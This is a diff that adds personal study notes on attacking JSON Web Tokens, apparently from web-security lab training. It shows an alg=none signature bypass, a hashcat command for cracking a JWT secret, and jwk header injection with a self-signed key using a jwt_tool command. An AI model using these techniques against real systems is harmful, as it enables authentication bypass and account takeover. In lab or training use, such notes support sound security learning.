@@ -16,3 +16,53 @@ The header and payload parts of a JWT are just base64url-encoded JSON objects. T
         "email": "carlos@carlos-montoya.net",
         "iat": 1516239022
     }
+
+# JWT auth bypass via flawed signature verification
+
+Example, 
+
+    {
+        kid":"3601f8c8-61c2-403b-8f0f-6889d4853ffb",
+        "alg":"none"
+    }
+change alg to none, and delete signature in the JWT
+
+# Brute-force jwt to find password 
+
+    hashcat -a 0 -m 16500 <jwt> <wordlist>
+
+# Header injections 
+
+According to specifications of JWT only `alg` header is mandatory, there are other headers that are used in JWT and attracts hackers. 
+    
+    jwk (json web key)
+    jwu (json web url)
+    kid  Provides an ID that servers can use to identify 
+
+## Injecting self-signed JWTs via the jwk parameter
+A JWK (JSON Web Key) is a standardized format for representing keys as a JSON object.
+Example :
+
+    {
+        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+        "typ": "JWT",
+        "alg": "RS256",
+        "jwk": {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
+        }
+    }
+
+when it's like this, we generate out own RSA key pairs, and sign the JWT outselves.
+using jwt_tools
+take the token into jwt_tools.py
+
+    python3 jwt_tool.py <JWT token> -X i -T
+
+and then change the paramateres for the attack 
+PS : watchout the KID needs to be the same in both fields
+
+// to create own script helpful link 
+https://ktor.io/docs/rsa-keys-generation.html#populating-the-jwks-json-file
